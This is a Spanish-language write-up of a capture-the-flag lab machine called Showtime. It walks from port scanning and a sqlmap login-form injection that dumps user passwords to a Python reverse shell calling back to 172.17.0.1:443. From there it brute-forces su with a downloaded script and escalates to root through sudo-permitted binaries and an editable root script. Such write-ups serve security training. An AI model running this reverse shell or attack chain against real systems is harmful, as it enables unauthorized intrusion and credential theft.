Escaneo de puertos con Nmap:

![](../../../Images/Pasted%20image%2020240724100312.png)

Observo lo que hay en el puerto 80:

![](../../../Images/Pasted%20image%2020240724100412.png)
Es una pagina web que contiene un casino y sus respectivos juegos

Haré fuzzing web usando la herramienta de Gobuster:

![](../../../Images/Pasted%20image%2020240724100928.png)

Y encuentro un directorio llamado /login_page

Veo lo que hay en esta dirección:

![](../../../Images/Pasted%20image%2020240724101000.png)

Tengo un panel de login

Voy a hacer una inyección SQL con ayuda de la herramienta Sqlmap para ver si es vulnerable:
1.  Enumeraré posibles bases de datos
```
sqlmap --url [http://172.17.0.3/login_page/](http://172.17.0.3/login_page/) --dbs --batch --forms
```

![](../../../Images/Pasted%20image%2020240724102205.png)

![](../../../Images/Pasted%20image%2020240724102216.png)

Usaré la base de datos Users

2. Enumeraré posibles tablas, de esta base de datos:

![](../../../Images/Pasted%20image%2020240724102310.png)

![](../../../Images/Pasted%20image%2020240724102320.png)

Tengo la tabla llamada Usuarios

3. Enumeraré posibles columnas de esta tabla:

![](../../../Images/Pasted%20image%2020240724102357.png)

![](../../../Images/Pasted%20image%2020240724102409.png)

Tengo 3 columnas id, password y username

4. Y por último, enumeraré usuarios de estas 3 columnas:

![](../../../Images/Pasted%20image%2020240724102726.png)

![](../../../Images/Pasted%20image%2020240724102740.png)

Tengo 3 usuarios con sus respectivas contraseñas

Probaré a entrar con el usuario Joe y su respectiva contraseña

![](../../../Images/Pasted%20image%2020240724102945.png)

Y estoy dentro:

![](../../../Images/Pasted%20image%2020240724103003.png)

Tengo un campo para escribir un comando o codigo en python y ver su resultado

Un ejemplo es:

![](../../../Images/Pasted%20image%2020240724103107.png)

Y doy click en "Ejecutar comando"

Y me da como resultado:

![](../../../Images/Pasted%20image%2020240724103134.png)

Ahora, sabiendo eso haré una reverse shell con python:

![](../../../Images/Pasted%20image%2020240724130255.png)

```
`import socket`
`import subprocess`
`import os`

`s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
`s.connect(("172.17.0.1", 443))`
`os.dup2(s.fileno(), 0)`
`os.dup2(s.fileno(), 1)`
`os.dup2(s.fileno(), 2)`
`p = subprocess.call(["/bin/sh", "-i"])`
```
Me pondré a la escucha con netcat por el puerto 443

![](../../../Images/Pasted%20image%2020240724125854.png)

Y doy click en el boton "Ejecutar Comando" y recibo automaticamente la rev shell

![](../../../Images/Pasted%20image%2020240724130656.png)

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020240724130726.png)

![](../../../Images/Pasted%20image%2020240724130751.png)

## ESCALADA DE PRIVILEGIOS

En la carpeta /tmp encuentro un archivo con unos trucos para un juego, pero en realidad pueden ser posibles contraseñas:

![](../../../Images/Pasted%20image%2020240725100027.png)

Así que primero pasaré esta lista de mayúsculas a minúsculas, con este comando:
```shell
tr '[:upper:]' '[:lower:]' < archivo.txt > archivo_minusculas.txt
```

![](../../../Images/Pasted%20image%2020240725100324.png)

Y listo ya lo tengo en minúsculas:

![](../../../Images/Pasted%20image%2020240725100356.png)

Ahora haré un ataque de fuerza bruta con este diccionario de contraseñas, así que me descargaré una herramienta en bash para que me automatice esta acción.

Usaré esta herramienta de Maalfer https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh

![](../../../Images/Pasted%20image%2020240725100600.png)

Me creo un servidor con python con el puerto 80 para enviarme esta herramienta hacia la maquina Showtime:

![](../../../Images/Pasted%20image%2020240725100724.png)

![](../../../Images/Pasted%20image%2020240725100901.png)

Y listo, ya tengo la herramienta de fuerza bruta en la maquina

Ahora le doy permisos de ejecución con chmod +x

![](../../../Images/Pasted%20image%2020240725100946.png)

Y ejecuto la herramienta de fuerza bruta contra el usuario joe y de contraseñas usaré el diccionario de las palabras pero en minusculas:

![](../../../Images/Pasted%20image%2020240725101046.png)

![](../../../Images/Pasted%20image%2020240725101057.png)

Y me la encontró

Ahora procedo a ser el usuario joe con su respectiva contraseña:

![](../../../Images/Pasted%20image%2020240725101157.png)

Ejecuto sudo -l para ver el binario que podré usar

![](../../../Images/Pasted%20image%2020240725101224.png)

Observo que puedo ser el usuario luciano con el binario Posh

Miro en GTFOBins como puedo escalar con este binario:

![](../../../Images/Pasted%20image%2020240725101302.png)

Lo ejecuto:

![](../../../Images/Pasted%20image%2020240725101352.png)

Y listo, ya soy el usuario luciano

Ejecuto sudo -l para ver el binario que podré usar

![](../../../Images/Pasted%20image%2020240725101415.png)

Observo que para ser root puedo ejecutar un script hecho en bash

Lo que contiene el script.sh ubicado en la carpeta /home/luciano es una reverse shell pero con una ip diferente a la mia, asi q procederé a modificar este archivo con una /bin/bash para que al momento de ejecutarlo sea root inmediatamente:

![](../../../Images/Pasted%20image%2020240725101701.png)

Lo ejecutamos:

![](../../../Images/Pasted%20image%2020240725101725.png)

Y listo, ya soy ROOT
